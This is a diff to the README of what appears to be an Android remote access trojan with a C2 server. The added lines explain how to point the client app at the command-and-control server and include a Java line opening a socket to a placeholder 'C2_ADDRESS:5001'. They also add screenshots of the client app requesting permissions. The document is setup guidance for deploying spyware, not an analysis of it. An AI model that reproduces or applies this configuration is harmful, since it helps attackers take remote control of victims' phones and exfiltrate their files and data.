@@ -36,6 +36,12 @@ resp.set_cookie(key="", value="", expires="", domain="your ip/domain")
 ```
 to enable Remember Me functionality in the Login page.
 
+Specify the URL of the C2 server in the [Client app](client/app/src/main/java/com/ot/androidrat/MainService.java#L32).
+
+```java
+Socket ioSocket = IO.socket(URI.create("http://C2_ADDRESS:5001"));
+```
+
 ## Production Environment Setup
 For linux envitonments, run ```server/setup.sh``` with a privileged user to make moukthar a service.
 ```console
@@ -61,7 +67,11 @@ server{
 ## Screenshots
 ![Login Page](screenshots/login.png)
 ![Dashboard](screenshots/dashboard.png)
+![Files](screenshots/files.png)
 ![Reset Password](screenshots/reset%20password.png)
+![Client app requesting permissions 1](screenshots/app-permission1.png)
+![Client app requesting permissions 2](screenshots/app-permission2.png)
+![Client app](screenshots/client-app.png)
 
 ## Warning
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
